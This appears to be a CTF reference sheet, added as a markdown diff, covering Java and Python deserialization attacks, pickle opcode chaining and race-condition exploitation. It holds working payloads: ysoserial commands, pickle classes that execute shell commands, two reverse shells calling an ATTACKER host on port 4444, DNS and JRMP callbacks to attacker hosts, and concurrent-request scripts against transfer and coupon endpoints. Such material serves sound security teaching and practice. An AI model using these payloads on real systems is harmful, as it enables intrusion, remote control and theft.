@@ -1,0 +1,163 @@
+# CTF Web - Deserialization & Execution Attacks
+
+For core injection attacks (SQLi, SSTI, SSRF, XXE, command injection), see [server-side.md](server-side.md).
+
+## Table of Contents
+- [Java Deserialization (ysoserial)](#java-deserialization-ysoserial)
+- [Python Pickle Deserialization](#python-pickle-deserialization)
+  - [Bypass restricted unpicklers](#bypass-restricted-unpicklers)
+- [Race Conditions (TOCTOU)](#race-conditions-toctou)
+  - [Common CTF race condition targets](#common-ctf-race-condition-targets)
+  - [Detection in source code](#detection-in-source-code)
+- [Pickle Chaining via STOP Opcode Stripping (VolgaCTF 2013)](#pickle-chaining-via-stop-opcode-stripping-volgactf-2013)
+
+---
+
+## Java Deserialization (ysoserial)
+
+**Pattern:** Java apps using `ObjectInputStream.readObject()` on untrusted input. Serialized Java objects in cookies, POST bodies, or ViewState (base64-encoded, starts with `rO0AB` or hex `aced0005`).
+
+**Detection:**
+- Base64 decode suspicious blobs — Java serialized data starts with magic bytes `AC ED 00 05`
+- Search for `ObjectInputStream`, `readObject`, `readUnshared` in source
+- Content-Type `application/x-java-serialized-object`
+- Burp extension: Java Deserialization Scanner
+
+**Key insight:** Deserialization triggers code in `readObject()` methods of classes on the classpath. If a "gadget chain" exists (sequence of classes whose `readObject` → method calls lead to arbitrary execution), the attacker gets RCE without needing to upload code.
+
+```bash
+# Generate payloads with ysoserial
+java -jar ysoserial.jar CommonsCollections1 'id' | base64
+java -jar ysoserial.jar CommonsCollections6 'cat /flag.txt' > payload.ser
+
+# Common gadget chains (try in order):
+# CommonsCollections1-7 (Apache Commons Collections)
+# CommonsBeanutils1 (Apache Commons BeanUtils)
+# URLDNS (no execution — DNS callback for blind detection)
+# JRMPClient (triggers JRMP connection)
+# Spring1/Spring2 (Spring Framework)
+
+# Blind detection via DNS callback (no RCE needed):
+java -jar ysoserial.jar URLDNS 'http://attacker.burpcollaborator.net' | base64
+
+# Send payload
+curl -X POST http://target/api -H 'Content-Type: application/x-java-serialized-object' \
+  --data-binary @payload.ser
+```
+
+**Bypass filters:**
+- If `ObjectInputStream` subclass blocklists specific classes, try alternative chains
+- `ysoserial-modified` and `GadgetProbe` enumerate available gadget classes
+- JNDI injection (Java Naming and Directory Interface): `java -jar ysoserial.jar JRMPClient 'attacker:1099'` + `marshalsec` JNDI server
+- For Java 17+ (module system restrictions): look for application-specific gadgets or Jackson/Fastjson deserialization instead
+
+---
+
+## Python Pickle Deserialization
+
+**Pattern:** Python apps deserializing untrusted data with `pickle.loads()`, `pickle.load()`, or `shelve`. Common in Flask/Django session cookies, cached objects, ML model files (`.pkl`), Redis-stored objects.
+
+**Detection:**
+- Base64 blobs containing `\x80\x04\x95` (pickle protocol 4) or `\x80\x05\x95` (protocol 5)
+- Source code: `pickle.loads()`, `pickle.load()`, `_pickle`, `shelve.open()`, `joblib.load()`, `torch.load()`
+- Flask sessions with `pickle` serializer (vs default `json`)
+
+**Key insight:** Python's `pickle.loads()` calls `__reduce__()` on deserialized objects, which can return `(os.system, ('command',))` — instant RCE. There is NO safe way to deserialize untrusted pickle data.
+
+```python
+import pickle, base64, os
+
+class RCE:
+    def __reduce__(self):
+        return (os.system, ('cat /flag.txt',))
+
+payload = base64.b64encode(pickle.dumps(RCE())).decode()
+print(payload)
+
+# For reverse shell:
+class RevShell:
+    def __reduce__(self):
+        return (os.system, ('bash -c "bash -i >& /dev/tcp/ATTACKER/4444 0>&1"',))
+
+# Using exec for multi-line payloads:
+class ExecRCE:
+    def __reduce__(self):
+        return (exec, ('import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])',))
+```
+
+**Bypass restricted unpicklers:**
+- `RestrictedUnpickler` may allowlist specific modules — chain through allowed classes
+- If `builtins` allowed: `(__builtins__.__import__, ('os',))` then chain `.system()`
+- YAML deserialization (`yaml.load()` without `Loader=SafeLoader`) has similar RCE via `!!python/object/apply:os.system`
+- NumPy `.npy`/`.npz` files: `numpy.load(allow_pickle=True)` triggers pickle
+
+---
+
+## Race Conditions (TOCTOU)
+
+**Pattern:** Server checks a condition (balance, registration uniqueness, coupon validity) then performs an action in separate steps. Concurrent requests between check and action bypass the validation.
+
+**Key insight:** Send identical requests simultaneously. The server reads the "before" state for all of them, then applies all changes — each request sees the pre-modification state.
+
+```python
+import asyncio, aiohttp
+
+async def race(url, data, headers, n=20):
+    """Send n identical requests simultaneously"""
+    async with aiohttp.ClientSession() as session:
+        tasks = [session.post(url, json=data, headers=headers) for _ in range(n)]
+        responses = await asyncio.gather(*tasks)
+        for r in responses:
+            print(r.status, await r.text())
+
+asyncio.run(race('http://target/api/transfer',
+    {'to': 'attacker', 'amount': 1000},
+    {'Cookie': 'session=...'},
+    n=50))
+```
+
+**Common CTF race condition targets:**
+- **Double-spend / balance bypass:** Transfer or purchase endpoint checked `if balance >= amount` → send 50 simultaneous transfers, all see original balance
+- **Coupon/code reuse:** Single-use codes validated then marked used → redeem simultaneously before mark
+- **Registration uniqueness:** `if not user_exists(name)` → register same username concurrently, one overwrites the other (admin account takeover)
+- **File upload + use:** Upload file, server validates then moves → access file between upload and validation (or between validation and deletion)
+
+```bash
+# Turbo Intruder (Burp) — most reliable for precise timing
+# Or use curl with GNU parallel:
+seq 50 | parallel -j50 curl -s -X POST http://target/api/redeem \
+  -H 'Cookie: session=TOKEN' -d 'code=SINGLE_USE_CODE'
+```
+
+**Detection in source code:**
+- Non-atomic read-then-write patterns without locks/transactions
+- `SELECT ... UPDATE` without `FOR UPDATE` or serializable isolation
+- File operations: `if os.path.exists()` then `open()` (classic TOCTOU)
+- Redis `GET` then `SET` without `WATCH`/`MULTI`
+
+---
+
+## Pickle Chaining via STOP Opcode Stripping (VolgaCTF 2013)
+
+**Pattern:** Chain multiple pickle operations in a single `pickle.loads()` call by stripping the STOP opcode (`\x2e`) from the first payload and concatenating a second payload.
+
+**Key insight:** The pickle VM executes instructions sequentially. Removing the STOP opcode from the first serialized object causes the deserializer to continue executing the second payload's `__reduce__` call. Combined with `os.dup2()` to redirect stdout to the socket FD, this enables output capture from `os.system()` over the network.
+
+```python
+import pickle, os
+
+class Redirect:
+    def __reduce__(self):
+        return (os.dup2, (5, 1))  # Redirect stdout to socket fd 5
+
+class Execute:
+    def __reduce__(self):
+        return (os.system, ('cat /flag.txt',))
+
+# Strip STOP opcode from first payload, concatenate second
+payload = pickle.dumps(Redirect())[:-1] + pickle.dumps(Execute())
+```
+
+**When to use:** Remote pickle deserialization where command output is not returned. Chain `dup2` first to redirect stdout/stderr to the socket, then execute commands.
+
+---
